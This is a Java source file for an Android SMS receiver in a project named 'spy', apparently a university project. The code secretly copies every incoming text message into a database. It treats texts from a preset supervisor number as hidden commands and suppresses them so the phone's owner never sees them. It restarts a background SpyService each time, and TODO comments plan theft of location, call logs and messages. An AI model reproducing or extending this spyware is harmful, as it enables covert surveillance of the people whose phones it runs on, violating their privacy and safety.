package edu.uj.jkordas.spy.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import edu.uj.jkordas.spy.DAO.SmsDataSource;
import edu.uj.jkordas.spy.PredefinedValues;
import edu.uj.jkordas.spy.SpyService;
import edu.uj.jkordas.spy.developer.Logger;


public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Logger.log(context, "message received");
        Bundle bundle = intent.getExtras();
        Object[] messages = (Object[]) bundle.get("pdus");
        SmsMessage[] sms = new SmsMessage[messages.length];
        // Create messages for each incoming PDU
        for (int n = 0; n < messages.length; n++) {
            sms[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
        }
        for (SmsMessage msg : sms) {
            // Verify if the message came from our known sender
            String sender = msg.getOriginatingAddress();
            String content = msg.getMessageBody();
            if (shouldMessageBeSnaffled(sender, content)) {
                Logger.log(context, sender + " " + content);
                // TODO: take appropriate action
                // get_location
                // get_call_logs
                // get_messages
                this.abortBroadcast();
            } else {
                // TODO: move to observer
                SmsDataSource datasource = new SmsDataSource(context);
                datasource.open();

                datasource.addSMS(sender, PredefinedValues.phoneNumber, content);
                datasource.close();
            }
        }

        restartSpyService(context);
    }

    private void restartSpyService(Context context) {
        Intent i = new Intent(context, SpyService.class);
        context.startService(i);
    }

    private boolean shouldMessageBeSnaffled(String sender, String messageBody) {
        if (sender.equals(PredefinedValues.supervisorNumber)
                && messageBody.length() >= PredefinedValues.supervisorPrefix.length()
                && messageBody.substring(0, PredefinedValues.supervisorPrefix.length()).equals(
                PredefinedValues.supervisorPrefix)) {
            return true;
        }

        return false;
    }
}
